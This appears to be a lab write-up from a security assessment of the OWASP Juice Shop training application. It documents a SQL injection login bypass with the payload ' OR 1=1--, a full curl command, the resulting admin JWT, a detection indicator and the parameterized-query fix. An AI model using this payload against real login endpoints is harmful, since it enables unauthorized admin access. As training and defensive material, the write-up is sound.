---
title: "Juice Shop · 04 · SQLi authentication bypass"
tags: [juiceshop, sqli, auth-bypass, critical]
verdict: confirmed
cwe: [CWE-89]
---

# 04 · SQLi auth bypass — 🟢 F1 confirmed (CRITICAL)

The login endpoint concatenates the email into the SQL query. `' OR 1=1--` matches the first row (admin) and logs in with no valid password.

## Command

```bash
curl -s -X POST http://localhost:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}' -o sqli.json -w "HTTP %{http_code}\n"
```

## Result

- **HTTP 200.** Response contains `authentication.token` — a valid JWT.
- Decoded header: `{"typ":"JWT","alg":"RS256"}`.
- Decoded payload: **`id=1  email=admin@juice-sh.op  role=admin`** — full admin session, no password supplied.

```
token_len=717   alg=RS256   subject=admin (id 1)
```

## Next

- Reuse the stolen admin token to reach protected data → [[juiceshop-05-bola-user-dump]].
- IOC for the SOC: `' OR 1=1--` (and SQL metacharacters) in login request bodies.
- **Root-cause fix:** parameterized queries / ORM bindings on the login path — collapses the entire kill chain.
